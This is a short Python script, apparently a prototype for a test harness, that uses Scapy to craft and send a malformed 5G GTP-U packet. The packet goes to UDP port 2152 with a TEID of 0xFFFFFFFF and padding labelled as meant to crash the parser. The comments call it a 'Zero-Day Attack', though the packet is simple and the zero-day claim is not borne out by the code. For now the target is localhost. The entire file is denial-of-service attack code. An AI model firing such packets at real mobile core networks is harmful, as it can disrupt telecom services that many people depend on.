from scapy.all import IP, UDP, ICMP, send
from scapy.contrib.gtp import GTP_U_Header

# Target is localhost for now until we build the FastAPI server
target_ip = "127.0.0.1" 

print(f"Crafting malformed 5G packet for {target_ip}...")

# Building the exact Zero-Day Attack
# - UDP Port 2152 is the standard GTP-U port
# - We inject the illegal 0xFFFFFFFF (-1) into the TEID
malicious_packet = (
    IP(dst=target_ip) / 
    UDP(dport=2152) / 
    GTP_U_Header(teid=0xFFFFFFFF) / 
    ICMP() / 
    "padding_to_crash_parser"
)

print("Firing the malicious GTP probe...")
send(malicious_packet, verbose=True)
